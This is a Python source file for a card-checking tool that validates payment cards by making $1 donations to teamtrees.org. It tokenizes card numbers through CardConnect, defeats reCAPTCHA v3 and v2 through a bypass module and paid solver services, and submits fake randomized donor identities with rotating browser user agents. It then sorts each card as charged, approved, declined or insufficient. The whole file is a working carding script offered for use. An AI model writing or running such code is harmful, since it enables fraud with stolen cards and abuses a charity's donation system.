import asyncio
import aiohttp
import random
import json
import re
from typing import Tuple, Optional

from recaptcha_bypass import get_recaptcha_v3_token, solve_recaptcha_v2, has_solver_key


class TeamTreesChecker:
    API_URL = "https://api.teamtrees.org/donation/add"
    TOKENIZE_URL = "https://fts.cardconnect.com/cardsecure/api/v1/ccn/tokenize"
    SITEKEY_V3 = "6LekL7sUAAAAAIEMWzw-yBiVhx3L4sO6JFlQwFVw"
    SITEKEY_V2 = "6LewL7sUAAAAANxb335WVv8Et7j2_dDzHxLlMpaP"
    DOMAIN = "teamtrees.org"
    PAGE_URL = "https://teamtrees.org/"

    FIRST_NAMES = [
        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
        "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
        "Thomas","Sarah","Charles","Karen","Christopher","Lisa","Daniel","Nancy",
    ]
    LAST_NAMES = [
        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    ]

    def __init__(self):
        self._ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        ]

    def _ua(self) -> str:
        return random.choice(self._ua_list)

    def _rand_identity(self) -> dict:
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        email = f"{first.lower()}{last.lower()}{random.randint(100,9999)}@protonmail.com"
        return {
            "name": f"{first} {last}",
            "email": email,
            "zip": f"{random.randint(10000,99999)}",
        }

    async def _tokenize_card(
        self, cc: str, session: aiohttp.ClientSession
    ) -> Optional[str]:
        try:
            async with session.post(
                self.TOKENIZE_URL,
                json={"account": cc},
                headers={
                    "User-Agent": self._ua(),
                    "Content-Type": "application/json",
                },
            ) as resp:
                data = await resp.json()
                if data.get("errorcode") == 0 and data.get("token"):
                    return data["token"]
                return None
        except Exception:
            return None

    async def check_card(
        self, cc: str, mm: str, yy: str, cvv: str
    ) -> Tuple[str, str]:
        if len(yy) == 4:
            yy = yy[2:]
        exp = f"{mm.zfill(2)}{yy.zfill(2)}"

        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout
        ) as session:
            token = await self._tokenize_card(cc, session)
            if not token:
                return "ERROR", "CardConnect tokenization failed"

            v3_token = await get_recaptcha_v3_token(
                self.SITEKEY_V3, self.DOMAIN, session=session
            )
            if not v3_token:
                return "ERROR", "reCAPTCHA v3 token generation failed"

            identity = self._rand_identity()

            donation = {
                "Amount": 1,
                "Name": identity["name"],
                "Email": identity["email"],
                "MobilePhone": "",
                "OptInForUpdates": False,
                "OptOutRecentDonations": True,
                "OptInForADFInformation": False,
                "Message": "",
                "IsGift": False,
                "GiftName": "",
                "GiftEmail": "",
                "GiftMessage": "",
                "Team": "",
                "CardConnect": {
                    "CardholderName": identity["name"],
                    "Token": token,
                    "ExpirationDate": exp,
                    "Cvv2": cvv,
                    "PostalCode": identity["zip"],
                    "CountryCode": "US",
                },
                "RecaptchaV3Token": v3_token,
            }

            headers = {
                "User-Agent": self._ua(),
                "Content-Type": "application/json; charset=utf-8",
                "Origin": "https://teamtrees.org",
                "Referer": "https://teamtrees.org/",
                "Accept": "application/json, text/plain, */*",
            }

            try:
                async with session.post(
                    self.API_URL, json=donation, headers=headers
                ) as resp:
                    status_code = resp.status
                    try:
                        data = await resp.json()
                    except Exception:
                        text = await resp.text()
                        return "ERROR", f"Non-JSON response ({status_code}): {text[:120]}"
            except Exception as e:
                return "ERROR", f"Request failed: {str(e)[:100]}"

            if status_code == 200 and isinstance(data, dict) and data.get("recaptchaV2Needed"):
                v2_token = await solve_recaptcha_v2(
                    self.SITEKEY_V2, self.PAGE_URL, session=session
                )
                if not v2_token:
                    return "ERROR", "reCAPTCHA v2 required — set CAPSOLVER_API_KEY or TWOCAPTCHA_API_KEY"

                donation["RecaptchaV2Token"] = v2_token
                donation.pop("RecaptchaV3Token", None)
                try:
                    async with session.post(
                        self.API_URL, json=donation, headers=headers
                    ) as resp2:
                        status_code = resp2.status
                        try:
                            data = await resp2.json()
                        except Exception:
                            text = await resp2.text()
                            return "ERROR", f"Non-JSON v2 response ({status_code}): {text[:120]}"
                except Exception as e:
                    return "ERROR", f"v2 request failed: {str(e)[:100]}"

            return self._parse_response(status_code, data)

    def _parse_response(self, status_code: int, data) -> Tuple[str, str]:
        if not isinstance(data, dict):
            return "ERROR", f"Unexpected response: {str(data)[:120]}"

        if data.get("recaptchaV2Needed"):
            return "ERROR", "reCAPTCHA v2 still required after solving"

        errors = data.get("errors", {})

        if status_code == 400 and errors:
            recaptcha_errors = errors.get("", [])
            for e in recaptcha_errors:
                if "reCAPTCHA" in e:
                    return "ERROR", f"reCAPTCHA validation failed: {e}"

            payment_errors = errors.get("Payment", [])
            if payment_errors:
                msg = payment_errors[0] if payment_errors else str(errors)
                return self._classify_payment_error(msg)

            all_errors = []
            for key, vals in errors.items():
                if isinstance(vals, list):
                    all_errors.extend(vals)
                else:
                    all_errors.append(str(vals))
            msg = "; ".join(all_errors) if all_errors else str(errors)
            return self._classify_payment_error(msg)

        if status_code == 200:
            if "id" in data or "donationId" in data or "success" in str(data).lower():
                return "CHARGED", f"$1 donation processed | ID: {data.get('id', data.get('donationId', '?'))}"
            return "APPROVED", f"Accepted: {json.dumps(data)[:120]}"

        return "ERROR", f"HTTP {status_code}: {json.dumps(data)[:120]}"

    def _classify_payment_error(self, msg: str) -> Tuple[str, str]:
        msg_lower = msg.lower()

        decline_keywords = [
            "decline", "declined", "do not honor", "insufficient",
            "invalid card", "invalid account", "lost card", "stolen card",
            "expired", "pickup", "restricted", "not permitted",
            "exceeds", "limit", "velocity", "fraud", "security violation",
            "card not accepted", "refer to issuer",
        ]
        for kw in decline_keywords:
            if kw in msg_lower:
                if "insufficient" in msg_lower:
                    return "INSUFFICIENT", f"INSUFFICIENT | {msg}"
                return "DECLINED", f"DECLINED | {msg}"

        ccn_keywords = [
            "invalid card number", "invalid account number",
            "invalid ccn", "luhn", "bad card",
        ]
        for kw in ccn_keywords:
            if kw in msg_lower:
                return "CCN", f"CCN | {msg}"

        if "approved" in msg_lower or "success" in msg_lower:
            return "APPROVED", f"APPROVED | {msg}"

        return "DECLINED", f"DECLINED | {msg}"
